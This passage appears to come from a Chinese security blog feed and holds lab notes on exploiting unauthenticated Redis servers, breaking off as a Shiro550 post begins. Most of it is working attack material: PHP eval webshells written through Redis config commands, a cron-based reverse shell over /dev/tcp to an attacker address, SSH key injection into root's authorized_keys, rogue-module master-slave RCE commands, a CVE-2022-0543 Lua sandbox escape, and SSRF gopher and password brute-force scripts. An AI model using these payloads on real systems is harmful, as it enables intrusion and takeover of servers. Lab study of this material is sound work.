latency<span class="hljs-punctuation">)</span>.<br><br>PORT     STATE SERVICE VERSION<br><span class="hljs-number">6379</span>/tcp open  redis   Redis key<span class="hljs-punctuation">-</span>value store <span class="hljs-number">2.8</span>.<span class="hljs-number">17</span> <span class="hljs-punctuation">(</span><span class="hljs-number">64</span> bits<span class="hljs-punctuation">)</span><br><span class="hljs-string">| redis-info: </span><br><span class="hljs-string">|   Version: 2.8.17</span><br><span class="hljs-string">|   Operating System: Linux 3.10.0-1160.el7.x86_64 x86_64</span><br><span class="hljs-string">|   Architecture: 64 bits</span><br><span class="hljs-string">|   Process ID: 10224</span><br><span class="hljs-string">|   Used CPU (sys): 0.06</span><br><span class="hljs-string">|   Used CPU (user): 0.01</span><br><span class="hljs-string">|   Connected clients: 2</span><br><span class="hljs-string">|   Connected slaves: 0</span><br><span class="hljs-string">|   Used memory: 512.22K</span><br><span class="hljs-string">|   Role: master</span><br><span class="hljs-string">|   Bind addresses: </span><br><span class="hljs-string">|     0.0.0.0</span><br><span class="hljs-string">|   Client connections: </span><br><span class="hljs-string">|_    192.168.88.129</span><br>MAC Address<span class="hljs-punctuation">:</span> <span class="hljs-number">00</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span>C<span class="hljs-punctuation">:</span><span class="hljs-number">29</span><span class="hljs-punctuation">:</span>A0<span class="hljs-punctuation">:</span><span class="hljs-number">53</span><span class="hljs-punctuation">:</span><span class="hljs-number">7</span>E <span class="hljs-punctuation">(</span>VMware<span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><p>连接</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">redis-<span class="hljs-keyword">cli</span> -h <span class="hljs-number">192.168</span><span class="hljs-number">.88</span><span class="hljs-number">.155</span><br>info <span class="hljs-meta">#查看信息</span><br></code></pre></td></tr></table></figure><h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><p>1.#bind 127.0.0.1 仅允许本地访问，如果有注释符，则外部可以链接Redis数据库<br>2.protected-mode no 安全模式（从 3.2 开始引入），默认关闭<br>3.redis服务有root权限，或者高权限，可做一些事</p><p>部分目录可能无权限写入，因为redis-server服务是普通用户权限开启的，这时候就需要root用户</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">config set dir /var/www/html</span><br><span class="language-xml">config set dbfilename redis.php</span><br><span class="language-xml">set webshell &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">或者</span><br><span class="language-xml"></span><br><span class="language-xml">set x &quot;\r\n\r\n</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">\r\n\r\n&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">bgsave</span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure><p>下面这个更好一点，可以减轻干扰。</p><h3 id="定时任务反弹shell"><a href="#定时任务反弹shell" class="headerlink" title="定时任务反弹shell"></a>定时任务反弹shell</h3><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino">允许异地登录 <br><span class="hljs-meta">#bind 127.0.0.1</span><br><br>安全模式<span class="hljs-keyword">protected</span>-mode处于关闭状态<br><span class="hljs-keyword">protected</span>-mode no<br><br>Redis服务使用ROOT账号启动<br></code></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs swift">flushall  <br><br><span class="hljs-comment">//设置启动目录</span><br>config <span class="hljs-keyword">set</span> dir <span class="hljs-regexp">/var/</span>spool<span class="hljs-operator">/</span>cron<br><br><span class="hljs-comment">//设置启动命令 实践可以，马上弹</span><br><span class="hljs-keyword">set</span> root <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>* * * * * bash -i &gt;&amp; /dev/tcp/192.168.88.129/9999 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br><br>待修改，没实验成功<br><span class="hljs-keyword">set</span> root <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.88.129/9999 0&gt;&amp;1 <span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br><br><span class="hljs-comment">//保存的文件名</span><br>config <span class="hljs-keyword">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure><p>注意：</p><p>默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;权限必须是600也就是<code>-rw——-</code>才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，而Centos的定时任务文件&#x2F;var&#x2F;spool&#x2F;cron&#x2F;权限644也能执行<br>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p><p>查看运行shell，linux区分大小写</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span><br></code></pre></td></tr></table></figure><h5 id="为什么有些命令找不到"><a href="#为什么有些命令找不到" class="headerlink" title="为什么有些命令找不到"></a>为什么有些命令找不到</h5><p>我早执行ifconfig时未找到，which一下</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@localhost</span> cron]<span class="hljs-comment"># which ifconfig</span><br><span class="hljs-regexp">/sbin/ifconfig</span><br></code></pre></td></tr></table></figure><p><strong>反弹 shell 很“瘦”</strong>，不像你平时登陆的终端那样加载完整的用户环境，它可能连 PATH 都不完整。</p><p><img src="/2025/04/17/Redis/kali-linux-2024.1-vmware-amd64-2025-04-15-21-37-44-17448930183791.png" alt="kali-linux-2024.1-vmware-amd64-2025-04-15-21-37-44"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">export <span class="hljs-title class_">PATH</span>=<span class="hljs-variable">$PATH</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/usr/sbin</span><br></code></pre></td></tr></table></figure><p>成功</p><p><img src="/2025/04/17/Redis/kali-linux-2024.1-vmware-amd64-2025-04-15-21-41-40-17448930183794.png" alt="kali-linux-2024.1-vmware-amd64-2025-04-15-21-41-40"></p><p>不是，这邮件是什么啊</p><p><img src="/2025/04/17/Redis/kali-linux-2024.1-vmware-amd64-2025-04-15-21-43-14-17448930183793.png" alt="kali-linux-2024.1-vmware-amd64-2025-04-15-21-43-14"></p><p>应该是redis那边写进去的定时任务还在跑，但是这边没有监听了。</p><h3 id="写入ssh公钥"><a href="#写入ssh公钥" class="headerlink" title="写入ssh公钥"></a>写入ssh公钥</h3><h5 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h5><p>1.允许异地登录<br>2.Redis服务使用ROOT账号启动<br>3.安全模式protected-mode处于关闭状态<br>4.允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器<br>5.&#x2F;root&#x2F;.ssh&#x2F;目录存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">在kali主机中执行：<br>ssh-keygen -t rsa<br><span class="hljs-built_in">cd</span> ~/.ssh/<br>(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>; <span class="hljs-built_in">cat</span> id_rsa.pub; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; key.txt<br><span class="hljs-built_in">cat</span> key.txt | redis-cli -h 192.168.88.155 -x <span class="hljs-built_in">set</span> xxx<br> <br>连接到192.168.88.155中执行：<br>redis-cli -h 192.168.88.155<br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /root/.ssh/<br>config <span class="hljs-built_in">set</span> dbfilename authorized_keys<br>save<br> <br>在kali中连接：<br><span class="hljs-built_in">cd</span> ~/.ssh/<br>ssh -i id_rsa root@192.168.88.155<br></code></pre></td></tr></table></figure><p><img src="/2025/04/17/Redis/image-20250415200234858-17448930183792.png" alt="image-20250415200234858"></p><h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>漏洞存在于<strong>4.x、5.x</strong>版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据尽量保持一致，从机只负责读，主机只负责写。</p><p>在Reids 4.x之后，通过外部拓展，可以实现在redis中实现一个新的Redis命令，构造恶意.so文件。</p><p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。</p><p>实验环境：redis4.0.2</p><h5 id="满足利用条件"><a href="#满足利用条件" class="headerlink" title="满足利用条件"></a>满足利用条件</h5><p>修改redis.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">原本<br><span class="hljs-built_in">bind</span> 127.0.0.1<br>protected-mode <span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure><p>修改后</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#bind 127.0.0.1</span><br><span class="hljs-keyword">protected</span>-mode no<br></code></pre></td></tr></table></figure><p>利用工具</p><p><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p><p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>对RedisModules-ExecuteCommand工具</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> src<br><span class="hljs-keyword">make</span><br></code></pre></td></tr></table></figure><p>可能报错缺少相关库，打开module.c文件，添加库文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>     <span class="hljs-comment">// ← 添加这行</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span>  <span class="hljs-comment">// ← 添加这行</span></span><br></code></pre></td></tr></table></figure><p>把module.so移动到redis-rce目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> ./src/module.so ../redis-rce-master<br></code></pre></td></tr></table></figure><p>使用 redis-rce</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> redis-rce.<span class="hljs-keyword">py</span> -r 目标ip-<span class="hljs-keyword">p</span> 目标端口 -L 本地ip -<span class="hljs-keyword">f</span> 恶意.<span class="hljs-keyword">so</span><br><br><span class="hljs-keyword">python</span> redis-rce.<span class="hljs-keyword">py</span> -r <span class="hljs-number">192.168</span>.<span class="hljs-number">88.155</span> -<span class="hljs-keyword">p</span> <span class="hljs-number">6379</span> -L <span class="hljs-number">192.168</span>.<span class="hljs-number">88.129</span> -<span class="hljs-keyword">f</span> module.<span class="hljs-keyword">so</span><br></code></pre></td></tr></table></figure><h3 id="CNVD-2019-21763"><a href="#CNVD-2019-21763" class="headerlink" title="CNVD-2019-21763"></a>CNVD-2019-21763</h3><p>RCE自动化利用脚本-vulfocus（需要版本4.x和5.x）</p><p>利用到工具：<a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a><br>参考文章：<a href="https://vulhub.org/#/environments/redis/4-unacc/">https://vulhub.org/#/environments/redis/4-unacc/</a></p><p>上传到175.178.151.29服务器中，然后执行：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> redis-master.py -r <span class="hljs-number">123.58.236.76</span> -p <span class="hljs-number">56879</span> -L <span class="hljs-number">47.100.167.248</span> -P <span class="hljs-number">1111</span> -f RedisModulesSDK/exp.so -c <span class="hljs-string">&quot;id&quot;</span><br></code></pre></td></tr></table></figure><h3 id="沙箱绕过RCE"><a href="#沙箱绕过RCE" class="headerlink" title="沙箱绕过RCE"></a>沙箱绕过RCE</h3><p>CVE-2022-0543-vulfocus</p><p>参考：<a href="https://vulhub.org/#/environments/redis/CVE-2022-0543/">https://vulhub.org/#/environments/redis/CVE-2022-0543/</a></p><p>Poc：执行id命令<br>连接到redis，执行；</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">redis-cli -h <span class="hljs-number">123.58</span><span class="hljs-number">.236</span><span class="hljs-number">.76</span> -p <span class="hljs-number">8736</span><br><span class="hljs-built_in">eval</span> &#x27;<span class="hljs-built_in">local</span> io_l = package.loadlib(<span class="hljs-string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="hljs-string">&quot;luaopen_io&quot;</span>); <span class="hljs-built_in">local</span> io = io_l(); <span class="hljs-built_in">local</span> f = io.popen(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-built_in">local</span> res = f:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*a&quot;</span>); f:<span class="hljs-built_in">close</span>(); <span class="hljs-built_in">return</span> res&#x27; <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>如果redis需要为有认证的，需要密码，我们也可以利用脚本爆破弱口令的密码（在后面）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.parse <br><br>url = <span class="hljs-string">&quot;http://xx.xx.xx.xx:8000/ssrf.php?url=&quot;</span><br><br>param = <span class="hljs-string">&#x27;dict://127.0.0.1:6788/auth:&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;d:\test\top100.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f: <span class="hljs-comment">#字典</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        passwd = f.readline()<br>        all_url = url + param + passwd<br>        <span class="hljs-comment"># print(all_url)</span><br>        request = urllib.request.Request(all_url)<br>        response = urllib.request.urlopen(request).read()<br>        <span class="hljs-comment"># print(response)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;+OK\r\n+OK\r\n&quot;</span>.encode() <span class="hljs-keyword">in</span> response:  <span class="hljs-comment">#因为是不知道是否正确，可以用not in</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;redis passwd: &quot;</span> + passwd)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>如果不需要密码，直接用下面的脚本；如果有密码，用上面的脚本爆，再用下面的脚本构成payload。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import urllib.parse<br>protocol=<span class="hljs-string">&quot;gopher://&quot;</span><br>ip=<span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port=<span class="hljs-string">&quot;6379&quot;</span><br><span class="hljs-built_in">shell</span>=<span class="hljs-string">&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span><br>filename=<span class="hljs-string">&quot;1.php&quot;</span><br>path=<span class="hljs-string">&quot;/var/www/html&quot;</span><br>passwd=<span class="hljs-string">&quot;&quot;</span>        <span class="hljs-comment">#如果无密码就不加，如果有密码就加 </span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">shell</span>.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span><br>     ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload=protocol+ip+<span class="hljs-string">&quot;:&quot;</span>+port+<span class="hljs-string">&quot;/_&quot;</span><br>def redis_format(arr):<br>    <span class="hljs-literal">CRLF</span>=<span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd=<span class="hljs-string">&quot;&quot;</span><br>    cmd+=<span class="hljs-string">&quot;*&quot;</span>+str(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd+=<span class="hljs-literal">CRLF</span>+<span class="hljs-string">&quot;$&quot;</span>+str(<span class="hljs-built_in">len</span>((x.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+<span class="hljs-literal">CRLF</span>+x.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd+=<span class="hljs-literal">CRLF</span><br>    <span class="hljs-literal">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += urllib.parse.<span class="hljs-literal">quote</span>(redis_format(x))<br>    print(urllib.parse.<span class="hljs-literal">quote</span>(payload))<br></code></pre></td></tr></table></figure><p>再提供一个脚本</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br>from urllib.parse import quote<br>from urllib.request import Request, urlopen<br><br>url = <span class="hljs-string">&quot;http://xxxxxx/?url=&quot;</span><br>gopher = <span class="hljs-string">&quot;gopher://127.0.0.1:6379/_&quot;</span><br><br>def get_password():<br>    f = open(<span class="hljs-string">&quot;message.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)         <span class="hljs-comment">#密码文件</span><br>    return f.readlines()<br><br>def encoder_url(cmd):<br>    urlencoder = quote(cmd).replace(<span class="hljs-string">&quot;%0A&quot;</span>, <span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>    return urlencoder<br><br><span class="hljs-comment">###------暴破密码，无密码可删除-------###</span><br><span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> get_password():<br>    <span class="hljs-comment"># 攻击脚本</span><br>    path = <span class="hljs-string">&quot;/var/www/html&quot;</span><br>    shell = <span class="hljs-string">&quot;\\n\\n\\n&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;\\n\\n\\n&quot;</span><br>    filename = <span class="hljs-string">&quot;shell.php&quot;</span><br><br>    cmd = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    auth %s</span><br><span class="hljs-string">    quit</span><br><span class="hljs-string">    &quot;&quot;&quot;</span> % password<br>    <span class="hljs-comment"># 二次编码</span><br>    encoder = encoder_url(encoder_url(cmd))<br>    <span class="hljs-comment"># 生成payload</span><br>    payload = url + gopher + encoder<br>    <span class="hljs-comment"># 发起请求</span><br>    print(payload)<br>    request = Request(payload)<br>    response = urlopen(request).read().decode()<br>    print(<span class="hljs-string">&quot;This time password is:&quot;</span> + password)<br>    print(<span class="hljs-string">&quot;Get response is:&quot;</span>)<br>    print(response)<br>    <span class="hljs-keyword">if</span> response.count(<span class="hljs-string">&quot;+OK&quot;</span>) &gt; <span class="hljs-number">1</span>:<br>        print(<span class="hljs-string">&quot;find password : &quot;</span> + password)<br>        <span class="hljs-comment">#####---------------如无密码，直接从此开始执行---------------#####</span><br>        cmd = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        auth %s</span><br><span class="hljs-string">        config set dir %s</span><br><span class="hljs-string">        config set dbfilename %s</span><br><span class="hljs-string">        set test1 &quot;%s&quot;</span><br><span class="hljs-string">        save</span><br><span class="hljs-string">        quit</span><br><span class="hljs-string">        &quot;&quot;&quot;</span> % (password, path, filename, shell)<br>        <span class="hljs-comment"># 二次编码</span><br>        encoder = encoder_url(encoder_url(cmd))<br>        <span class="hljs-comment"># 生成payload</span><br>        payload = url + gopher + encoder<br>        <span class="hljs-comment"># 发起请求</span><br>        request = Request(payload)<br>        print(payload)<br>        response = urlopen(request).read().decode()<br>        print(<span class="hljs-string">&quot;response is:&quot;</span> + response)<br>        <span class="hljs-keyword">if</span> response.count(<span class="hljs-string">&quot;+OK&quot;</span>) &gt; <span class="hljs-number">5</span>:<br>            print(<span class="hljs-string">&quot;Write success！&quot;</span>)<br>            <span class="hljs-keyword">exit</span>()<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&quot;Write failed. Please check and try again&quot;</span>)<br>            <span class="hljs-keyword">exit</span>()<br>        <span class="hljs-comment">#####---------------如无密码，到此处结束------------------#####</span><br>print(<span class="hljs-string">&quot;Password not found!&quot;</span>)<br>print(<span class="hljs-string">&quot;Please change the dictionary,and try again.&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="正确做法"><a href="#正确做法" class="headerlink" title="正确做法"></a>正确做法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">设置密码<br>requirepass your_strong_password<br>限制只在本地登录，监听本地端口<br><span class="hljs-built_in">bind</span> 127.0.0.1<br>开启安全模式<br>protected-mode <span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://xz.aliyun.com/news/12517">Redis漏洞及其利用方式-先知社区</a></p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro550</title>
      <link href="/2025/04/12/shiro550/"/>
      <url>/2025/04/12/shiro550/</url>
      
        <content type="html"><![CDATA[<h2 id="shiro550"><a href="#shiro550" class="headerlink" title="shiro550"></a>shiro550</h2><p>CVE-2016-4437</p><p>Apache Shiro 是一个强大且灵活的开源安全框架，用于身份验证、授权、加密和会话管理。</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://goodapple.top/archives/139">https://goodapple.top/archives/139</a></p><p><a href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载shiro源码，打开Maven项目with source</p><p>选择shiro\sample\web目录</p><h3 id="修改pom-xml配置文件"><a href="#修改pom-xml配置文件" class="headerlink" title="修改pom.xml配置文件"></a>修改pom.xml配置文件</h3><p>添加版本和两处注释</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml">        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span 